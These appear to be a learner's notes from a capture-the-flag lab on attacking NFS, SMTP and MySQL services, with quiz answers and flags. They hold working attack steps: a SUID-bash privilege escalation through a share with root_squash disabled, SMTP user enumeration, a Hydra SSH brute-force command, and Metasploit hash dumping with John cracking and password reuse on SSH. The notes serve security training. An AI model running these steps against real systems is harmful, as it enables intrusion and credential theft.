## NFS 


### **What is NFS?**

NFS (==Network File System==) allows systems to share directories and files over a network. It enables users and programs to access files on remote systems as if they were local. NFS achieves this by mounting a portion of the file system from a server, with access controlled by assigned privileges.

---

### **How Does NFS Work?**

1. **Mounting a Directory**:
    
    - A client requests to mount a remote directory to a local one, similar to mounting a physical device.
    - The mount service connects to the mount daemon via RPC.
2. **Server Validation**:
    
    - The server checks the user's permissions to access the directory and returns a **file handle** to uniquely identify files/directories on the server.
3. **File Access**:
    
    - To access a file, the client sends an RPC call to the server's **NFS daemon (NFSD)**.
    - The call includes:
        - File handle
        - File name
        - User's ID and group ID
    - These details determine user permissions (e.g., read/write access).

---

### **NFS Compatibility**

- NFS allows file sharing between systems running Windows, Linux, MacOS, or UNIX.
- Windows Server can act as an NFS server for non-Windows clients, and vice versa.

---

### **Additional Resources**

- [Oracle Documentation on NFS](https://docs.oracle.com/cd/E19683-01/816-4882/6mb2ipq7l/index.html)
- [Datto: What is NFS File Share?](https://www.datto.com/blog/what-is-nfs-file-share/)
- [NFS SourceForge Documentation](http://nfs.sourceforge.net/)
- [Arch Linux Wiki on NFS](https://wiki.archlinux.org/index.php/NFS)

---

`What process allows an NFS client to interact with a remote directory as though it was a physical device?`

`Mounting
`
`What protocol does NFS use to communicate between the server and client?`

`RPC`


`What two pieces of user data does the NFS server take as parameters for controlling user permissions? Format: parameter 1 / parameter 2`

`user id / group id`


`What is the latest version of NFS? [released in 2016, but is still up to date as of 2020]` 

`4.2`


### NFS-Common Installation and Setup

#### **NFS-Common Package Overview**

To interact with NFS shares, you need to install the **nfs-common** package. It includes tools for mounting and interacting with NFS shares, such as:

- **showmount**: to list available shares on the server.
- **mount.nfs**: to mount the NFS share to your local system.

Install it with:

```bash
sudo apt install nfs-common
```

#### **Mounting NFS Shares**

1. **Create a Mount Point**: You first need to create a directory where you will mount the NFS share.
    
    ```bash
    sudo mkdir /tmp/mount
    ```
    
2. **Mount the NFS Share**: Use the `mount` command to mount the NFS share.
    
    ```bash
    sudo mount -t nfs <IP_ADDRESS>:<share_name> /tmp/mount/ -nolock
    ```
    
    - Replace `<IP_ADDRESS>` with the IP address of the NFS server.
    - Replace `<share_name>` with the specific NFS share.

###### **Explanation of Command**

- **sudo**: Run with superuser privileges.
- **mount**: Mount command to attach the NFS share to your system.
- **-t nfs**: Specifies the type of filesystem to mount (NFS).
- **IP:share**: The NFS server's IP and the share you want to mount.
- **-nolock**: Prevents the use of NLM (Network Lock Manager) locking.

This will allow you to interact with the NFS server's shared resources.



### Enumuration 

Based on the Nmap scan output, the NFS service is running on port 2049 (`nfs 3-4 (RPC #100003)`), but to list the available NFS shares, you need to use the `showmount` command.

To find the visible share, run the following command:

```bash
sudo /usr/sbin/showmount -e 10.10.150.50
```

This will display the list of NFS shares available on the server at IP `10.10.150.50`. The name of the visible share will be listed under the "Export list" section.



The error message `mount.nfs: mount point /tmp/mount/ does not exist` indicates that the directory `/tmp/mount/` does not exist on your system. You need to create the directory before attempting to mount the NFS share.

###### Solution:

1. **Create the mount point directory**: Run the following command to create the `/tmp/mount/` directory:
    
    ```bash
    sudo mkdir -p /tmp/mount
    ```
    
2. **Mount the NFS share again**: Now, try mounting the NFS share again:
    
    ```bash
    sudo mount -t nfs IP:Share /tmp/mount/ -nolock
    ```
    
			└─$ sudo mount -t nfs 10.10.150.50:/home /tmp/mount/ -nolock

> after coppying the shares to /tmp/mount cd'd  and looked for important files ,
> 
> found ssh files they have keys so i logged in via ssh after changing the permetions to ==chmod 600==



### NFS Access for Privilege Escalation

Let's break down the process of leveraging NFS shares to escalate privileges by bypassing `root_squash` and using **SUID** files.

#### **Step 1: Check NFS Root Squashing**

`root_squash` is a configuration in NFS that prevents remote users from gaining root access to the NFS share. If disabled, a remote user can escalate privileges.

To check whether root squashing is disabled, you'll need to query the NFS server for configuration settings. Typically, this information is found in `/etc/exports`. If root squashing is disabled, remote users could have root access to the NFS share.

#### **Step 2: Upload a Bash Executable to NFS**

Once you have access to the NFS share, the next step is uploading an executable that will allow you to escalate privileges.

###### Summary of Steps:

1. NFS Access
2. Gain low-privilege shell
3. Upload bash executable to NFS share
4. Set SUID permissions through misconfigured root squashing
5. SSH into target
6. Execute the bash shell with SUID to escalate to root access

By completing this sequence, you'll have successfully escalated privileges to root on the target machine using NFS shares and SUID binaries.



###### Steps to Complete the Privilege Escalation

Let's walk through the steps to escalate privileges and find the root flag.

#### **1. Navigate to the NFS Mount Point**

After mounting the NFS share, first navigate to the mount point where the share is accessible.

```bash
cd /tmp/mount/
```

Now, navigate to the user's home directory:

```bash
cd /home/username/
```

#### **2. Download the Bash Executable**

Download the bash executable to your `Downloads` directory using `wget` or `scp` from the target machine.

```bash
scp -i key_name username@10.10.150.50:/bin/bash ~/Downloads/bash
```

#### **3. Copy the Bash Executable to the NFS Share**

Once the `bash` executable is in your `Downloads` folder, copy it to the NFS share:

```bash
cp ~/Downloads/bash .
```

#### **4. Change Ownership to Root**

To allow the executable to run with root privileges, change the ownership of the file to `root`:

```bash
sudo chown root bash
```

#### **5. Set the SUID Bit**

Now, set the SUID bit on the bash executable. The SUID bit allows the file to be executed with the privileges of the file's owner (in this case, root). To set the SUID bit using `chmod`, you use the letter `s`:

```bash
sudo chmod +s bash
```

#### **6. Check Permissions**

Verify that the permissions are set correctly using `ls -la bash`. The output should show the permissions ending with `-rwsr-xr-x`, indicating the SUID bit is set.

```bash
ls -la bash
```

Example output:

```bash
-rwsr-sr-x 1 root root 1234567 Jan 8 23:00 bash
```

#### **7. SSH into the Target Machine**

Log into the target machine using SSH with the credentials you have.

```bash
ssh -i key_name username@10.10.150.50
```

#### **8. Verify Bash Executable Exists**

Once logged in, confirm that the `bash` executable is present in the directory by listing the contents:

```bash
ls -la
```

Make sure the `bash` file is there.

#### **9. Execute the Bash Shell with SUID**

Run the bash shell with the `-p` flag to preserve the permissions:

```bash
./bash -p
```

The `-p` option ensures that the permissions are preserved and that the bash shell runs with root privileges.

#### **10. Gaining Root Access**

Once you've executed the command, you should now have a root shell! You can confirm root access by running:

```bash
whoami
```

You should see `root`.

#### **11. Find the Root Flag**

Finally, locate the root flag in the `/root` directory and display it:

```bash
cat /root/root.txt
```

The root flag should be:

```
THM{nfs_got_pwned}
```

###### Conclusion

Congratulations, you've successfully used the NFS share and SUID bit to escalate privileges and obtain the root flag!





## SMTP

### Understanding SMTP



**What is SMTP?**  
SMTP stands for =="Simple Mail Transfer Protocol"==.is a protocol used to send emails. It works alongside POP or IMAP, which handle incoming email retrieval, to enable complete email communication.

**Key Functions of SMTP Servers:**

1. Verify the sender's identity.
2. Send outgoing emails.
3. Notify the sender if the email can't be delivered.

**How SMTP Works:**

![[Pasted image 20250109151427.png]]


- The sender's email client connects to the SMTP server over port ==25 (or alternatives like 587/465).==
- The email details (sender, recipient, body, and attachments) are submitted.
- The sender's SMTP server communicates with the recipient's SMTP server to relay the email.
- If successful, the recipient's SMTP server forwards the email to their POP/IMAP server, making it accessible in their inbox.

**Protocols Complementing SMTP:**

- **POP (Post Office Protocol):** Downloads emails to the client.
- **IMAP (Internet Message Access Protocol):** Synchronizes emails between the client and the server.

**Use in Security and Testing:**  
SMTP services are often targeted in penetration testing and reconnaissance for misconfigurations or vulnerabilities. Tools like `Telnet` and `Nmap` can enumerate SMTP servers and test for relay settings or banner grabbing.

For more detailed technical insights, refer to [HowStuffWorks](https://computer.howstuffworks.com/e-mail-messaging/email3.htm).

---

#### Q&A

`What is the first step in the SMTP process?`

`SMTP handshake`


`What is the default SMTP port?`

`25`

`Where does the SMTP server send the email if the recipient's server is not available?`

`smtp queue`


`On what server does the Email ultimately end up on?`

`POP/IMAP`


### Enumerating SMTP

**1. Server Fingerprinting**

- Use Metasploit's **"smtp_version"** module to scan IP ranges and determine the mail server version for precise targeting.
    
- Alternatively, perform manual fingerprinting by sending EHLO/HELO commands to the server and analyzing the responses.
    

**2. User Enumeration**

- Leverage SMTP commands like `VRFY` and `EXPN` to confirm valid users and reveal aliases or mailing lists.
    
    - Example commands:
        
        ```
        telnet <IP> 25
        VRFY username
        EXPN alias
        ```
        
- Use Metasploit's **"smtp_enum"** module with a wordlist to automate user enumeration.
    
    - Example:
        
        ```
        use auxiliary/scanner/smtp/smtp_enum
        set RHOSTS <target_ip>
        set USER_FILE <path_to_wordlist>
        run
        ```
        
- Alternatively, tools like **smtp-user-enum** can perform similar tasks:
    
    ```
    smtp-user-enum -M VRFY -U <path_to_wordlist> -t <target_ip>
    ```
    

**3. Requirements**

- Ensure Metasploit is installed and updated:
    
    ```
    sudo apt update && sudo apt upgrade
    ```
    
- For manual enumeration, use tools like **smtp-user-enum**, which can be installed from repositories or cloned from GitHub.
    

**4. OSCP Considerations**

- For OSCP preparation, using manual tools like **smtp-user-enum** is recommended to avoid reliance on Metasploit, which might be restricted in certain exam scenarios.
    

---

### Exploiting SMTP

**What Do We Know?**

1. A valid user account name.
    
2. The type of SMTP server and operating system running.
    
3. SSH is the only other open port.
    

**Exploitation Steps**

- Attempt bruteforce login on the SSH service using tools like Hydra.
    

#### Using Hydra for Bruteforce

Hydra is a versatile tool for password attacks against various services, including SSH. Ensure you have a wordlist such as `rockyou.txt`.

**Syntax:**

```
hydra -t 16 -l <username> -P /usr/share/wordlists/rockyou.txt -vV <target_ip> ssh
```

**Options Breakdown:**

|Section|Function|
|---|---|
|hydra|Runs the hydra tool|
|`-t 16`|Sets the number of parallel connections per target|
|`-l <username>`|Specifies the username to bruteforce|
|`-P <path_to_wordlist>`|Points to the file containing possible passwords|
|`-vV`|Enables very verbose mode, displaying login attempts|
|`<target_ip>`|Specifies the IP address of the target|
|ssh|Defines the protocol for bruteforce|

#### Metasploit for Exploitation

If further vulnerabilities are discovered, Metasploit can be used:

1. Search for relevant SMTP exploits:
    
    ```
    search smtp
    ```
    
2. Select and configure an exploit:
    
    ```
    use <exploit_path>
    set RHOSTS <target_ip>
    set other options as required
    run
    ```
    

---

### Tools Overview

#### **Hydra**

- **Description:** A powerful tool for cracking login credentials of various protocols, including SSH, FTP, and SMTP.
    
- **Usage:**
    
    - Dictionary attacks with customizable parameters.
        
    - Suitable for brute-forcing credentials quickly with multiple connections.
        
- **Example:**
    
    ```
    hydra -l <username> -P <path_to_wordlist> -t 16 -vV <target_ip> ssh
    ```
    

#### **Metasploit Framework**

- **Description:** A comprehensive penetration testing framework with modules for enumeration, exploitation, and post-exploitation.
    
- **Usage:**
    
    - Enumeration modules (e.g., `smtp_enum`, `smtp_version`).
        
    - Exploit modules for targeting specific vulnerabilities.
        
- **Example:**
    
    ```
    use auxiliary/scanner/smtp/smtp_enum
    set RHOSTS <target_ip>
    set USER_FILE <path_to_wordlist>
    run
    ```
    

---

### Summary: Enumerating and Exploiting SMTP

**1. Enumeration:**

- Fingerprinting the SMTP server version.
    
- Enumerating users with `VRFY` and `EXPN` commands.
    

**2. Exploitation:**

- Using the gathered information to bruteforce SSH or other accessible services.
    

**3. Tools Used:**

- Hydra for password attacks.
    
- Metasploit for enumeration and potential exploitation.
    

This approach is effective against poorly configured mail servers and aids in gaining an initial foothold during penetration testing.

## MySQL

### Understanding MySQL

**What is MySQL?**  
MySQL is a **Relational Database Management System (RDBMS)** that operates based on **Structured Query Language (SQL)**. Let's break down the key terms:

- **Database**: A structured and persistent collection of data.
- **RDBMS**: A system used to create and manage relational databases, where data is organized into tables that relate to one another via primary and foreign keys.
- **SQL**: The language used for interacting with the database, performing operations such as querying, updating, and managing data.

MySQL is one of the most popular implementations of an RDBMS. It uses a **client-server model**, where clients interact with the server using SQL. Other RDBMS products like **PostgreSQL** and **Microsoft SQL Server** also rely on SQL syntax.

---

#### How Does MySQL Work?

MySQL operates as a **server** that processes instructions and requests related to databases. The key workflow can be summarized as follows:

1. **Database Creation**: MySQL creates a database to store and manipulate data, defining relationships between tables.
2. **Client Requests**: Clients send SQL statements to request operations like data retrieval, insertion, or updates.
3. **Server Response**: The MySQL server processes the requests and responds with the appropriate information or actions.

The **MySQL Protocol** facilitates communication between the server and its clients.

---

#### What Runs MySQL?

MySQL can run on various platforms, including **Linux** and **Windows**. It is widely used as a backend database system for many major websites. MySQL is a core component of the **LAMP stack**, which consists of:

- **L**inux
- **A**pache
- **M**ySQL
- **P**HP (or Perl/Python)

This combination is especially popular for web development.

---

#### Additional Resources

For a deeper dive into MySQL's technical implementation and working:

- [MySQL Server Documentation: SQL Execution](https://dev.mysql.com/doc/dev/mysql-server/latest/PAGE_SQL_EXECUTION.html)
- [W3Schools: PHP and MySQL Introduction](https://www.w3schools.com/php/php_mysql_intro.asp)

This overview provides a basic understanding of MySQL, its operation, and its role in database management systems.

---

#### **Q&A**

**What type of software is MySQL?**  
MySQL is a **Relational Database Management System (RDBMS)**.

**What language is MySQL based on?**  
MySQL is based on **Structured Query Language (SQL)**.

**What communication model does MySQL use?**  
MySQL uses a **client-server communication model**.

**What is a common application of MySQL?**  
MySQL is commonly used as a backend database for web applications.

**What major social network uses MySQL as their back-end database?**  
**Facebook** uses MySQL as their primary backend database, heavily customized for their needs.



### **Enumerating MySQL**

#### **When Do You Attack MySQL?**

MySQL is rarely the initial target for enumeration or exploitation. Instead, it typically becomes relevant after obtaining credentials or other information from other services. For example:

- **Scenario**: After enumerating subdomains of a web server, you discover the credentials `"root:password"`. You try them on SSH without success, then decide to test them on the MySQL service.

---

#### **Requirements**

- **MySQL Client**: Ensure the MySQL client is installed on your system.
    
    - **Installation**:
        
        ```bash
        sudo apt install default-mysql-client
        ```
        
    - This installs only the client, not the server.
- **Metasploit Framework**: Installed by default on Kali Linux and Parrot OS.
    

---

#### **Alternatives to Metasploit**

You can use other tools to enumerate MySQL if Metasploit is not available:

1. **Nmap’s `mysql-enum` Script**  
    Documentation: [mysql-enum](https://nmap.org/nsedoc/scripts/mysql-enum.html)  
    Example Command:
    
    ```bash
    nmap -p 3306 --script=mysql-enum <target-ip>
    ```
    
2. **Exploit-DB Tools**  
    Example: [Exploit-DB: 23081](https://www.exploit-db.com/exploits/23081)
    
3. **Manual Enumeration**  
    After completing the task, revisit it manually to understand how tools retrieve the information.
    

---

#### **Let’s Begin!**

Now, use Metasploit or alternative tools to start enumerating MySQL. Ensure you understand the process behind each action to strengthen your knowledge.



#### **Q&A: Enumerating MySQL**

**1. What port is MySQL using?**  
**3306**

---

**2. What three options do we need to set?**

- `RHOSTS`
- `USERNAME`
- `PASSWORD`

---

**3. What result does the "select version()" command give you?**  
`5.7.29-0ubuntu0.18.04.1`

---

**4. How many databases are returned?**  
**4** databases:

- `information_schema`
- `mysql`
- `performance_schema`
- `sys`



### Exploiting MySQL: Summary

#### What do we know?

- **MySQL Server Credentials**: We have the login details to authenticate.
- **MySQL Version**: Helps determine exploitable vulnerabilities.
- **Databases and Their Names**: We know which databases exist, assisting in targeting specific ones.

#### Key Terminology

- **==Schema==**: Synonymous with a database in MySQL. For example, `CREATE SCHEMA` instead of `CREATE DATABASE`.
- **==Hashes==**: Used to store passwords securely. We extract password hashes to attempt cracking.

---

### Q & A

1. **Module for schema dump**:
   - Full name: `auxiliary/scanner/mysql/mysql_schemadump`
   - Command:  
     ```bash
     search mysql_schemadump
     use 0
     set rhosts 10.10.132.143
     set username root
     set password password
     run
     ```

2. **Last table dumped**:  
   - `x$waits_global_by_latency`

3. **Module for hash dump**:
   - Full name: `auxiliary/scanner/mysql/mysql_hashdump`
   - Command:  
     ```bash
     search mysql_hashdump
     use 0
     run
     ```

4. **Non-default user**:  
   - `carl`

5. **User/Hash combination**:  
   - `carl:*EA031893AA21444B170FC2162A56978B8CEECE18`

6. **Cracked password**:  
   - `doggie`
   - Command:  
     ```bash
     john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
     ```

7. **Password reuse risk**:  
   - High, due to simplicity of the password.
   - so we tried it in SSH service we manage to login to Carl's SSH . 

8. **Contents of `MySQL.txt`**:  
   - `THM{congratulations_you_got_the_mySQL_flag}`

---

This summary provides a clear path of commands and results for exploiting MySQL. Let me know if you need further details!